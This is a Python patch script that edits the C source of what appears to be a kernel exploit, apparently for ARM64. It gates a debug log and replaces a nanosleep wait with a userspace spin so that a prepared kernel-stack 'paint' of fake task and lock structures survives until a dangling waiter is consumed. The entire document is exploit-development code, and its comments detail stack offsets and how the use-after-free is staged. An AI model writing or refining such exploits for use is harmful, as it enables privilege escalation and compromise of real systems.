p='src/core/fops.c'
s=open(p).read()

# 1) post-paint log is a deep write() syscall -> clobbers the paint. Gate it.
a='''    pr_info("ssopt paintret ret=%d errno=%d fd=%d base=%016zx task=%016zx "
            "lock=%016zx\\n",
            ret, saved_errno, sock_paint_fd, page_base, fake_task, fake_lock);'''
b='''    if (env_flag("SSOPT_LOG", 0))
      pr_info("ssopt paintret ret=%d errno=%d fd=%d base=%016zx task=%016zx "
              "lock=%016zx\\n",
              ret, saved_errno, sock_paint_fd, page_base, fake_task, fake_lock);'''
assert s.count(a)==1,('log anchor',s.count(a)); s=s.replace(a,b,1)

# 2) block/deep syscalls clobber the shallow setsockopt paint region.
#    Park in USERSPACE (no syscall) so the paint at SP0-0x1c0..0x160 survives.
a='''    atomic_store(&pselect_select_done, 1);
    atomic_store(&punch_consume_go, attempt);
    /* Original design relies on this thread sitting INSIDE a syscall while the
     * consumer fires (the walk reads the dangling waiter off this stack).  Do
     * NOT return to userspace: block in nanosleep, whose tiny frame never
     * reaches the waiter at SP0-0x1b0, so the paint stays intact. */
    for (int nap = 0; nap < 60 && !atomic_load(&pselect_walk_done); nap++) {
      struct timespec sl = {.tv_sec = 0, .tv_nsec = 20000000};
      nanosleep(&sl, NULL);
    }'''
b='''    atomic_store(&pselect_select_done, 1);
    atomic_store(&punch_consume_go, attempt);
    /* Park in USERSPACE: any syscall here (nanosleep goes ~0x1b0 deep, file
     * write even deeper) would overwrite the shallow paint at SP0-0x1c0..0x160
     * (task@-0x180, lock@-0x178).  No syscall until the consumer has walked. */
    for (int spin = 0;
         spin < 2000000000 && !atomic_load(&pselect_walk_done);
         spin++) {
      __asm__ volatile("yield" ::: "memory");
    }'''
assert s.count(a)==1,('block anchor',s.count(a)); s=s.replace(a,b,1)
open(p,'w').write(s); print('spin-park + gated log patched')
